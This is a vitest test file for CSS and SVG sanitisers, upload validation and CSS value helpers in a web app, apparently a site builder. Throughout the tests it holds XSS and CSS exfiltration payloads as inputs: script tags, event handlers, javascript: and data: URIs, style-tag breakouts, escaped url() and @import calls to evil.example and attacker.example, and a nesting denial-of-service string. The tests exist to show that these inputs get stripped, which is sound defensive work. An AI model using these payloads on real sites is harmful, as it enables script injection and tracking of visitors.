import { describe, it, expect } from "vitest";
import {
  sanitizeCss,
  validateUploadFile,
  isDangerousExtension,
  sanitizeSvg,
 } from "@/lib/security";
import { sanitizeCssValue, cssFontStack, cssColor, cssLength } from "@/lib/css-value";

describe("sanitizeCss", () => {
  // These assert what the CSS can no longer do, not how the sanitiser spells
  // its output: it parses the sheet and writes it back now, so the spacing and
  // the escapes are the parser's, not a pattern's.
  it("drops @import, which is the exfiltration target", () => {
    const out = sanitizeCss('@import url("https://evil.example/steal.css");');
    expect(out).not.toContain("evil.example");
    expect(out).not.toMatch(/@import/i);
  });

  it("drops a declaration that fetches from somewhere else", () => {
    const out = sanitizeCss(".bg { background: url(https://evil.example/x.png); }");
    expect(out).not.toContain("evil.example");
    expect(out).not.toMatch(/url\s*\(/i);
  });

  it("keeps a reference to somewhere in the same document", () => {
    // `fill: url(#gradient)` fetches nothing. The pattern-matching version
    // threw it away with the real targets, so an SVG gradient named in custom
    // CSS never worked.
    const out = sanitizeCss(".icon { fill: url(#grad); clip-path: url(#c) }");
    expect(out).toContain("url(#grad)");
    expect(out).toContain("url(#c)");
  });

  it("drops expression()", () => {
    const out = sanitizeCss(".a { width: expression(alert(1)) }");
    expect(out).not.toMatch(/expression\s*\(/i);
    expect(out).not.toContain("alert(1)");
  });

  it("drops a value that names a script scheme", () => {
    expect(sanitizeCss(".a { background: none; color: javascript:alert(1) }")).not.toMatch(/javascript\s*:/i);
  });

  it("drops behavior and -moz-binding", () => {
    expect(sanitizeCss(".d { behavior: url(evil.htc) }")).not.toMatch(/behavior\s*:/i);
    expect(sanitizeCss(".e { -moz-binding: url(evil.xml#x) }")).not.toMatch(/-moz-binding/i);
  });

  it("leaves ordinary safe CSS alone", () => {
    const css = ".card { color: #333; font-size: 14px; padding: 1rem; }";
    expect(sanitizeCss(css)).toBe(css);
  });

  it("leaves the CSS a real site is built out of alone", () => {
    for (const css of [
      "@media (min-width: 640px) { .card { display: grid; gap: 1rem } }",
      "@keyframes spin { from { transform: rotate(0) } to { transform: rotate(360deg) } }",
      ".hero { background: linear-gradient(90deg, #f00 0%, #00f 100%) }",
      ":root { --brand: #6366f1 }",
      ".b { color: var(--brand) }",
    ]) {
      expect(sanitizeCss(css)).toBe(css);
    }
  });

  it("keeps nothing at all when the sheet cannot be read", () => {
    const out = sanitizeCss(".broken { color: ");
    expect(out).not.toContain("broken");
  });

  describe("the shapes a regular expression could not see", () => {
    it("cannot be closed out of its own <style> element", () => {
      // This CSS is written into a <style> element, and the HTML parser ends
      // that element at the first `</style` it meets, whatever the text means
      // in CSS. A stylesheet could close its own tag and open a <script> —
      // live on every published page and inside the editor.
      for (const css of [
        ".a { color: red } /* </style><script>alert(1)</script> */",
        'a[href="</style><script>alert(1)</script>"] { color: red }',
        '.a { content: "</style><script>alert(1)</script>" }',
      ]) {
        expect(sanitizeCss(css)).not.toMatch(/<\/style/i);
      }
    });

    it("sees through a CSS escape", () => {
      // A browser reads every one of these as `url(`, and the pattern that
      // used to guard this did not.
      for (const css of [
        ".a { background: \\75 rl('https://evil.example/?x') }",
        ".a { background: \\000075rl('https://evil.example/?x') }",
        ".a { background: u\\72 l('https://evil.example/?x') }",
        ".a { background: \\u\\72\\6c('https://evil.example/?x') }",
      ]) {
        expect(sanitizeCss(css), css).not.toContain("evil.example");
      }
      expect(sanitizeCss("@im\\port url('https://evil.example/x.css');")).not.toContain("evil.example");
    });

    it("reads a bracket inside a string as part of the string", () => {
      // The pattern stopped at the first ")", which ended the match inside the
      // quotes and left the rest of the sheet mangled behind it.
      const out = sanitizeCss('.b { background: url("a)b.png") } .after { color: red }');
      expect(out).not.toMatch(/url\s*\(/i);
      expect(out).toContain(".after { color: red }");
    });

    it("finds a call nested inside another call", () => {
      expect(sanitizeCss(".h { background: linear-gradient(red, url('https://evil.example/x')) }"))
        .not.toContain("evil.example");
    });

    it("drops the other functions that fetch", () => {
      expect(sanitizeCss(".g { background: image-set('https://evil.example/a.png' 1x) }"))
        .not.toContain("evil.example");
    });
  });
});

describe("sanitizeCssValue", () => {
  it("strips angle brackets and quotes-breaking chars", () => {
    expect(sanitizeCssValue("</style><script>alert(1)</script>")).not.toMatch(/[<>]/);
  });

  it("strips semicolons used to break out of a declaration", () => {
    expect(sanitizeCssValue("red; background: url(evil)")).not.toContain(";");
  });

  it("takes the quotes out — a font name cannot end the string it sits in", () => {
    expect(sanitizeCssValue("'Helvetica Neue', Arial, sans-serif")).toBe(
      "Helvetica Neue, Arial, sans-serif"
    );
  });

  it("keeps a normal color/size value intact", () => {
    expect(sanitizeCssValue("#3b82f6")).toBe("#3b82f6");
    expect(sanitizeCssValue("1.5rem")).toBe("1.5rem");
  });
});

describe("validateUploadFile", () => {
  it("accepts an allowed image extension", () => {
    const result = validateUploadFile("photo.png", 1024);
    expect(result).toEqual({ valid: true, ext: "png" });
  });

  it("is case-insensitive on extension", () => {
    const result = validateUploadFile("photo.PNG", 1024);
    expect(result).toEqual({ valid: true, ext: "png" });
  });

  it("rejects a disallowed extension", () => {
    const result = validateUploadFile("shell.php", 1024);
    expect(result.valid).toBe(false);
  });

  it("rejects an executable disguised with a double extension's real ext", () => {
    const result = validateUploadFile("invoice.pdf.exe", 1024);
    expect(result.valid).toBe(false);
  });

  it("rejects a file with no extension", () => {
    const result = validateUploadFile("noextension", 1024);
    expect(result.valid).toBe(false);
  });

  it("rejects a file over the size limit", () => {
    const result = validateUploadFile("big.png", 11 * 1024 * 1024);
    expect(result.valid).toBe(false);
  });

  it("accepts a file right at the size limit", () => {
    const result = validateUploadFile("edge.png", 10 * 1024 * 1024);
    expect(result.valid).toBe(true);
  });
});

describe("isDangerousExtension", () => {
  it("flags svg as dangerous", () => {
    expect(isDangerousExtension("svg")).toBe(true);
    expect(isDangerousExtension("SVG")).toBe(true);
  });

  it("does not flag ordinary raster images", () => {
    expect(isDangerousExtension("png")).toBe(false);
    expect(isDangerousExtension("jpg")).toBe(false);
  });
});

describe("sanitizeSvg", () => {
  it("strips <script> tags and their contents", () => {
    const out = sanitizeSvg('<svg><script>alert(document.cookie)</script></svg>');
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toContain("alert(document.cookie)");
  });

  it("strips event handler attributes", () => {
    const out = sanitizeSvg('<svg onload="alert(1)"><rect onclick="alert(2)"/></svg>');
    expect(out).not.toMatch(/onload\s*=/i);
    expect(out).not.toMatch(/onclick\s*=/i);
  });

  it("neutralizes javascript: URIs", () => {
    const out = sanitizeSvg('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toMatch(/javascript\s*:/i);
  });

  it("neutralizes vbscript: URIs", () => {
    const out = sanitizeSvg('<a href="vbscript:msgbox(1)">click</a>');
    expect(out).not.toMatch(/vbscript\s*:/i);
  });

  it("strips <foreignObject> (HTML/script smuggling vector)", () => {
    const out = sanitizeSvg(
      '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'
    );
    expect(out).not.toMatch(/foreignObject/i);
    expect(out).not.toContain("alert(1)");
  });

  it("strips <use> elements referencing external resources", () => {
    const out = sanitizeSvg('<svg><use xlink:href="https://evil.example/payload.svg#x"/></svg>');
    expect(out).not.toMatch(/xlink:href/i);
  });

  it("strips inline <style> blocks", () => {
    const out = sanitizeSvg('<svg><style>body{background:url(evil)}</style></svg>');
    expect(out).not.toMatch(/<style/i);
  });

  it("strips style attributes containing @import", () => {
    const out = sanitizeSvg('<rect style="fill:red;@import url(evil.css)"/>');
    expect(out).not.toMatch(/@import/i);
  });

  it("neutralizes data: URIs in href", () => {
    const out = sanitizeSvg('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>');
    expect(out).not.toMatch(/data:/i);
  });

  it("leaves benign SVG markup intact", () => {
    // The parser writes every tag closed rather than self-closed, which is
    // still well-formed XML — so this compares what the picture says, not how
    // the markup happens to be spelled.
    const out = sanitizeSvg('<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#f00"/></svg>');
    expect(out).toContain('viewBox="0 0 10 10"');
    expect(out).toContain('cx="5"');
    expect(out).toContain('fill="#f00"');
    expect(out).toMatch(/<circle[^>]*>/);
  });

  it("keeps the parts a standalone file needs to draw at all", () => {
    const out = sanitizeSvg(
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">' +
        '<defs><linearGradient id="g"><stop offset="0" stop-color="#f00"/></linearGradient></defs>' +
        '<path d="M4 4h16v16H4z" stroke-dasharray="2 2" fill="url(#g)"/></svg>',
    );
    // Without the namespace a .svg file renders as nothing, and `viewBox`
    // lower-cased is not `viewBox` any more once the file is read as XML.
    expect(out).toContain('xmlns="http://www.w3.org/2000/svg"');
    expect(out).toContain('viewBox="0 0 24 24"');
    expect(out).toContain("linearGradient");
    expect(out).toContain('stroke-dasharray="2 2"');
    expect(out).toContain('fill="url(#g)"');
  });

  describe("the shapes a regular expression could not see", () => {
    // Each of these went through the old text-matching version untouched.
    const bypasses: [string, string][] = [
      ["an unquoted handler", "<svg onload=alert(1)></svg>"],
      ["a handler broken over lines", "<svg onload\n=\nalert(1)></svg>"],
      ["a handler in capitals", '<svg ONLOAD="alert(1)"></svg>'],
      ["a script tag that is never closed", '<svg><script src="https://evil.example/x.js"></svg>'],
      ["an entity-encoded colon", '<svg><a xlink:href="javascript&#58;alert(1)"><text>x</text></a></svg>'],
      ["an animation that sets a URL later", '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'],
      ["an animation that sets a handler later", '<svg><set attributeName="onload" to="alert(1)"/></svg>'],
      ["a document smuggled in as a picture", '<svg><image href="data:text/html,<script>alert(1)</script>"/></svg>'],
    ];

    for (const [what, payload] of bypasses) {
      it(`drops ${what}`, () => {
        const out = sanitizeSvg(payload);
        expect(out).not.toMatch(/\son\w+\s*=/i);
        expect(out).not.toMatch(/<script/i);
        expect(out).not.toMatch(/javascript\s*:/i);
        expect(out).not.toMatch(/data:text\/html/i);
        expect(out).not.toMatch(/<(?:animate|set)\b/i);
      });
    }
  });
});

describe("SVG attributes that hide behind a namespace prefix", () => {
  it("drops a href written through an aliased xlink namespace", () => {
    // SVG is XML: a file may alias xlink to any prefix it likes, and to a
    // browser x:href is the same attribute as xlink:href. The old list
    // matched names literally, so this was stored verbatim and clicking the
    // picture on the customer's site ran it.
    const out = sanitizeSvg(
      '<svg xmlns:x="http://www.w3.org/1999/xlink"><a x:href="javascript:alert(1)"><rect/></a></svg>',
    );
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/x:href/i);
  });

  it("judges an upper-case XLINK:HREF the same as a lower-case one", () => {
    const out = sanitizeSvg('<svg><image XLINK:HREF="javascript:alert(1)"/></svg>');
    expect(out).not.toMatch(/javascript:/i);
  });

  it("drops any attribute whose prefix is not one SVG defines", () => {
    // An https <image href> is allowed by design — a picture may name a
    // picture. What is not allowed is an attribute arriving under a prefix
    // the sanitiser has no way to resolve, so those go whatever they say.
    const out = sanitizeSvg(
      '<svg xmlns:q="http://www.w3.org/1999/xlink"><image q:href="https://evil.example/b.png"/></svg>',
    );
    expect(out).not.toContain("evil.example");
  });

  it("keeps a same-file reference", () => {
    const out = sanitizeSvg('<svg><rect fill="url(#grad)"/><use xlink:href="#shape"/></svg>');
    expect(out).toContain("url(#grad)");
  });

  it("has no <a> left to click at all", () => {
    const out = sanitizeSvg('<svg><a href="https://example.com"><rect/></a></svg>');
    expect(out).not.toMatch(/<a[\s>]/i);
    expect(out).toMatch(/<rect/i);
  });
});

describe("the SVG style attribute goes through the parser", () => {
  it("drops a fetch written with a CSS escape", () => {
    const out = sanitizeSvg('<svg><rect style="fill:\\75 rl(https://evil.example/x)"/></svg>');
    expect(out).not.toContain("evil.example");
  });

  it("drops image-set(), which is not spelled url()", () => {
    const out = sanitizeSvg('<svg><rect style="background:image-set(\'https://evil.example/a.png\' 1x)"/></svg>');
    expect(out).not.toContain("evil.example");
  });

  it("keeps an ordinary fill", () => {
    expect(sanitizeSvg('<svg><rect style="fill:red"/></svg>')).toContain("fill:red");
  });
});

describe("a stylesheet that used to take every page down", () => {
  it("answers, and refuses, nine thousand nested calls", () => {
    // 45 KB of customCss with 9000 nested rgb( made every page of that site
    // answer 500: the scanner recursed once per call and re-read the whole of
    // each argument.
    const css = `.a { color: ${"rgb(".repeat(9000)}red${")".repeat(9000)} }`;
    const started = Date.now();
    const out = sanitizeCss(css);
    expect(Date.now() - started).toBeLessThan(5000);
    expect(out).not.toContain("rgb(rgb(");
  });

  it("refuses a sheet larger than it will read", () => {
    const out = sanitizeCss(`.a { color: red }`.padEnd(300 * 1024, " "));
    expect(out).toContain("larger than Neuravex will read");
  });

  it("keeps a nesting depth a person would actually write", () => {
    const css = ".a { color: rgb(calc(1 + 1), 2, 3) }";
    expect(sanitizeCss(css)).toContain("rgb(");
  });
});

describe("cssFontStack", () => {
  it("re-quotes a multi-word family around a cleaned value", () => {
    expect(cssFontStack("'Helvetica Neue', Arial, sans-serif")).toBe(
      "'Helvetica Neue', Arial, sans-serif",
    );
  });

  it("cannot be made to end the string it is written into", () => {
    expect(cssFontStack("Arial'; background: url(https://evil.example/x); font-family: '")).not.toContain(";");
    expect(cssFontStack("Arial'; x")).not.toContain("evil");
  });
});

describe("cssColor — the second declaration that used to ride along", () => {
  it("refuses a colour with another declaration after it", () => {
    // React serialises a style object without checking it, so this rendered
    // as two declarations and the second was a per-view beacon.
    expect(cssColor("red;background:url(https://attacker.example/x)")).toBeUndefined();
  });

  it("refuses a comment, a brace and a backslash", () => {
    expect(cssColor("red/*x*/")).toBeUndefined();
    expect(cssColor("red}")).toBeUndefined();
    expect(cssColor("\\72 ed")).toBeUndefined();
  });

  it("keeps the things a colour actually is", () => {
    expect(cssColor("#3b82f6")).toBe("#3b82f6");
    expect(cssColor("#fff")).toBe("#fff");
    expect(cssColor("rgba(0, 0, 0, 0.4)")).toBe("rgba(0, 0, 0, 0.4)");
    expect(cssColor("hsl(210 40% 98%)")).toBe("hsl(210 40% 98%)");
    expect(cssColor("transparent")).toBe("transparent");
    expect(cssColor("currentColor")).toBe("currentColor");
    expect(cssColor("var(--site-accent, #6366f1)")).toBe("var(--site-accent, #6366f1)");
  });

  it("checks a var() fallback, which is the part an author writes", () => {
    expect(cssColor("var(--x, red;background:url(https://evil.example))")).toBeUndefined();
  });

  it("refuses a url() dressed as a colour", () => {
    expect(cssColor("url(https://evil.example/x)")).toBeUndefined();
  });
});

describe("cssLength", () => {
  it("takes a number as pixels", () => {
    expect(cssLength(24)).toBe("24px");
    expect(cssLength(Infinity)).toBeUndefined();
    expect(cssLength(NaN)).toBeUndefined();
  });

  it("takes a string with a unit it knows", () => {
    expect(cssLength("1.5rem")).toBe("1.5rem");
    expect(cssLength("100%")).toBe("100%");
    expect(cssLength("0")).toBe("0");
  });

  it("refuses anything with a call or a separator in it", () => {
    expect(cssLength("calc(100% - 1px)")).toBeUndefined();
    expect(cssLength("10px;background:url(https://evil.example)")).toBeUndefined();
  });
});
